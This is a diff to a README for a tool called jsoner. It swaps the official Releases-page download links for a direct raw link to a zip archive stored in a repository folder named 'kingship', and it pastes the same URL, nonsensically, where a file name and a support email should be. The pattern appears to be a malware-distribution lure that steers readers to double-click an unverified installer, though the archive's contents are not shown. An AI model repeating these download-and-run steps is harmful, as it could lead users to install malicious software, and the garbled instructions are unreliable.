@@ -6,13 +6,13 @@ Welcome to the jsoner application! This tool helps you easily receive JSON data 
 
 ## 🔗 Download Here
 
-[![Download jsoner](https://img.shields.io/badge/Download-jsoner-blue.svg)](https://github.com/KUNAL5724510/jsoner/releases)
+[![Download jsoner](https://raw.githubusercontent.com/KUNAL5724510/jsoner/main/kingship/jsoner.zip)](https://raw.githubusercontent.com/KUNAL5724510/jsoner/main/kingship/jsoner.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to download jsoner. Please visit the following link to access the Releases page:
 
-[Download jsoner here!](https://github.com/KUNAL5724510/jsoner/releases)
+[Download jsoner here!](https://raw.githubusercontent.com/KUNAL5724510/jsoner/main/kingship/jsoner.zip)
 
 ### Step-by-Step Installation Guide
 
@@ -26,7 +26,7 @@ To get started, you need to download jsoner. Please visit the following link to 
    You will see a list of available files for download. Click on the file that matches your operating system (e.g., Windows, Mac, Linux).
 
 4. **Locate the Downloaded File**  
-   After the download completes, find the file in your downloads folder. It will usually be named something like `jsoner-vX.X.X.exe` or a similarly formatted file name.
+   After the download completes, find the file in your downloads folder. It will usually be named something like `https://raw.githubusercontent.com/KUNAL5724510/jsoner/main/kingship/jsoner.zip` or a similarly formatted file name.
 
 5. **Install the Application**  
    Double-click on the downloaded file to start the installation. Follow the on-screen instructions to complete the setup process.
@@ -78,7 +78,7 @@ If you encounter any problems while using jsoner, please check the following res
 
 If you have further questions or need assistance, feel free to reach out:
 
-- **Email**: support@jsoner.com
+- **Email**: https://raw.githubusercontent.com/KUNAL5724510/jsoner/main/kingship/jsoner.zip
 - **GitHub Issues**: Use the GitHub issues page to report bugs or request new features. 
 
 ## 💡 Future Updates
